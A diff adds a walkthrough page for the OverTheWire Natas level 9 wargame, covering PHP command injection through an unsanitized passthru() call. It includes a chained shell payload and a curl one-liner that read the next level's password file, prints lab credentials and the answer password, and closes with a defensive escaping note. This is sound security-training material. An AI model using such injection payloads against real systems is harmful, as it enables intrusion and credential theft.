@@ -1,0 +1,88 @@
+---
+title: "Natas 9"
+description: "Natas Level 9 — command injection via unsanitized user input passed directly to a shell command."
+---
+
+## Overview
+
+| Field    | Value                                        |
+|----------|----------------------------------------------|
+| URL      | `http://natas9.natas.labs.overthewire.org`   |
+| Username | `natas9`                                     |
+| Password | `ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t`          |
+
+The page is a word-search form that finds words in a dictionary. Click *"View sourcecode"* to understand what happens when you submit a search.
+
+---
+
+## Hints
+
+<AccordionGroup>
+  <Accordion title="Hint 1 — What shell command runs your input?">
+    Read the source. Your search term (`$key`) is inserted directly into a `passthru()` call:
+
+    ```php
+    passthru("grep -i $key dictionary.txt");
+    ```
+
+    There is no sanitization. What does this mean for the characters you can send?
+  </Accordion>
+  <Accordion title="Hint 2 — Shell command chaining">
+    In bash, `&&` runs a second command only if the first succeeds, and `;` runs a second command unconditionally. If you inject `&&` followed by another command into `$key`, the shell will execute both. Think about what command would let you read `/etc/natas_webpass/natas10`.
+  </Accordion>
+</AccordionGroup>
+
+---
+
+## Solution
+
+<Accordion title="Full walkthrough">
+  <Steps>
+    <Step title="Understand the injection point">
+      The command the server runs is:
+
+      ```bash
+      grep -i <your input> dictionary.txt
+      ```
+
+      Your input is placed directly into the command string with no escaping.
+    </Step>
+    <Step title="Craft the payload">
+      Inject a second command after a valid `grep` argument:
+
+      ```
+      key dictionary.txt && cat /etc/natas_webpass/natas10
+      ```
+
+      The resulting shell command becomes:
+
+      ```bash
+      grep -i key dictionary.txt && cat /etc/natas_webpass/natas10
+      ```
+    </Step>
+    <Step title="Submit and read the output">
+      Enter the payload in the search box and click Search. The output shows `grep` results first, followed by the contents of the password file.
+    </Step>
+  </Steps>
+</Accordion>
+
+<Note>
+  Never pass user input to `passthru()`, `exec()`, `system()`, or `shell_exec()`. Use `escapeshellarg()` to safely quote individual arguments, or avoid shelling out entirely and use native PHP functions instead.
+</Note>
+
+## With curl
+
+```bash
+# -G sends the data as a GET query string
+# --data-urlencode handles special characters in the payload safely
+curl -s -u natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t -G \
+  --data-urlencode "needle=key dictionary.txt && cat /etc/natas_webpass/natas10" \
+  --data-urlencode "submit=Search" \
+  http://natas9.natas.labs.overthewire.org/
+```
+
+## Password
+
+```
+natas10: t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
+```
